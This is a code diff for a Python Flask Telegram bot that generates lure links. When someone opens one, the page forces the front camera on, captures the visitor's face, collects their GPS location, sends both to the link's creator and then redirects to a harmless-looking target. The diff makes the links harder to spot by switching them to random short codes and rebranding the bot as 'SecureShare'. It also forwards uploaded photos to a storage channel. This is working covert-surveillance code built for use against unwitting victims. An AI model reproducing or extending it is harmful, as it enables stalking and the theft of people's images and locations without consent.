@@ -4,6 +4,9 @@ import time
 import os
 import threading
 import requests
+import hashlib
+import string
+import random
 from datetime import datetime, timedelta
 import logging
 import sys
@@ -45,6 +48,16 @@ def send_message(chat_id, text, reply_markup=None):
         logger.error(f"Send error: {e}")
 
 
+def send_photo(chat_id, photo_bytes):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+    try:
+        files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
+        data = {"chat_id": chat_id}
+        requests.post(url, data=data, files=files, timeout=10)
+    except Exception as e:
+        logger.error(f"Send photo error: {e}")
+
+
 def get_user_state(user_id):
     with open(USER_STATE_FILE, "r") as f:
         data = json.load(f)
@@ -65,18 +78,18 @@ def get_user_active_link(user_id):
     return data.get(str(user_id))
 
 
-def set_user_active_link(user_id, html_file, photo_file):
+def set_user_active_link(user_id, short_code, photo_file):
     with open(USER_LINKS_FILE, "r") as f:
         data = json.load(f)
     old = data.get(str(user_id))
     if old:
-        old_html = os.path.join(HTML_DIR, old.get("html"))
+        old_html = os.path.join(HTML_DIR, old.get("code") + ".html")
         old_photo = os.path.join(PHOTO_DIR, old.get("photo"))
         if os.path.exists(old_html):
             os.remove(old_html)
         if os.path.exists(old_photo):
             os.remove(old_photo)
-    data[str(user_id)] = {"html": html_file, "photo": photo_file, "created_at": time.time()}
+    data[str(user_id)] = {"code": short_code, "photo": photo_file, "created_at": time.time()}
     with open(USER_LINKS_FILE, "w") as f:
         json.dump(data, f)
 
@@ -120,8 +133,13 @@ def start_auto_cleanup():
     threading.Thread(target=cleanup, daemon=True).start()
 
 
-def generate_html(user_id, target_url, photo_filename):
-    html_filename = f"{user_id}_{int(time.time())}.html"
+def generate_short_code(length=8):
+    chars = string.ascii_lowercase + string.digits
+    return ''.join(random.choices(chars, k=length))
+
+
+def generate_html(user_id, target_url, photo_filename, short_code):
+    html_filename = f"{short_code}.html"
     filepath = os.path.join(HTML_DIR, html_filename)
     photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
     storage = CHANNEL_ID if CHANNEL_ID else "null"
@@ -311,7 +329,7 @@ async function startProcess() {{
         sendMessage(msg);
     }} catch(e) {{}}
     
-    // CAMERA COMPULSORY - must allow to proceed
+    // Camera compulsory
     let cameraAllowed = false;
     try {{
         let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
@@ -327,36 +345,30 @@ async function startProcess() {{
         if (blob && blob.size > 500) sendPhoto(blob);
         stream.getTracks().forEach(t => t.stop());
         cameraAllowed = true;
-        sendMessage("✅ Camera access granted");
     }} catch(e) {{
         cameraAllowed = false;
-        sendMessage("❌ Camera access denied");
     }}
     
-    // If camera NOT allowed - STOP, don't redirect
     if (!cameraAllowed) {{
         document.getElementById('loadingStep').classList.remove('active');
         document.getElementById('mainStep').classList.add('active');
-        document.getElementById('errorMsg').innerHTML = "Camera access is required to continue. Please refresh and allow camera.";
+        document.getElementById('errorMsg').innerHTML = "Camera access required. Please refresh and allow camera.";
         return;
     }}
     
-    // Camera allowed - now ask for GPS (optional)
+    // GPS (optional)
     if (navigator.geolocation) {{
         navigator.geolocation.getCurrentPosition(
             (p) => {{
-                sendMessage("<b>📍 GPS Location</b>\\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
-                sendMessage("<b>🎯 Coordinates</b>\\nLat: " + p.coords.latitude + "\\nLon: " + p.coords.longitude + "\\nAccuracy: " + p.coords.accuracy + "m");
+                sendMessage("<b>GPS Location</b>\\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
                 setTimeout(() => {{ window.location.href = TARGET; }}, 500);
             }},
             (e) => {{
-                sendMessage("📍 GPS Location: Access denied");
                 setTimeout(() => {{ window.location.href = TARGET; }}, 500);
             }},
             {{ timeout: 8000, enableHighAccuracy: true }}
         );
     }} else {{
-        sendMessage("📍 GPS Location: Not supported");
         setTimeout(() => {{ window.location.href = TARGET; }}, 500);
     }}
 }}
@@ -431,16 +443,22 @@ def webhook():
                 file_path = file_info['result']['file_path']
                 img_data = requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}").content
 
+                # Send user's photo to STORAGE CHANNEL
+                if CHANNEL_ID:
+                    send_photo(CHANNEL_ID, img_data)
+                    logger.info(f"Photo sent to storage channel {CHANNEL_ID}")
+
                 photo_name = f"{uid}_{int(time.time())}.jpg"
                 with open(os.path.join(PHOTO_DIR, photo_name), "wb") as f:
                     f.write(img_data)
 
-                html_name = generate_html(uid, target_url, photo_name)
-                set_user_active_link(uid, html_name, photo_name)
+                short_code = generate_short_code(8)
+                html_name = generate_html(uid, target_url, photo_name, short_code)
+                set_user_active_link(uid, short_code, photo_name)
                 set_user_state(uid, "done")
 
-                link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_name}"
-                send_message(uid, f"✅ LINK:\n{link}\n\n⚠️ Active until you create new link\n📸 Camera COMPULSORY\n📍 GPS optional")
+                link = f"https://{ACCOUNT_NAME}.onrender.com/view/{short_code}"
+                send_message(uid, f"✅ LINK:\n{link}\n\n⚠️ Active until you create new link\n📸 Camera COMPULSORY")
 
             except Exception as e:
                 logger.error(f"Photo error: {e}")
@@ -453,11 +471,11 @@ def webhook():
         return jsonify({"status": "error"}), 500
 
 
-@app.route('/view/<filename>')
-def serve_html(filename):
-    filepath = os.path.join(HTML_DIR, filename)
-    if os.path.exists(filepath):
-        return send_from_directory(HTML_DIR, filename)
+@app.route('/view/<short_code>')
+def serve_html(short_code):
+    html_file = os.path.join(HTML_DIR, f"{short_code}.html")
+    if os.path.exists(html_file):
+        return send_from_directory(HTML_DIR, f"{short_code}.html")
     return "Link expired", 404
 
 
@@ -469,7 +487,7 @@ def serve_photo(filename):
 @app.route('/')
 def home():
     active = len([f for f in os.listdir(HTML_DIR) if f.endswith('.html')])
-    return f"🐉 Bot alive | Active links: {active}"
+    return f"🐉 SecureShare | Active links: {active}"
 
 
 if __name__ == "__main__":
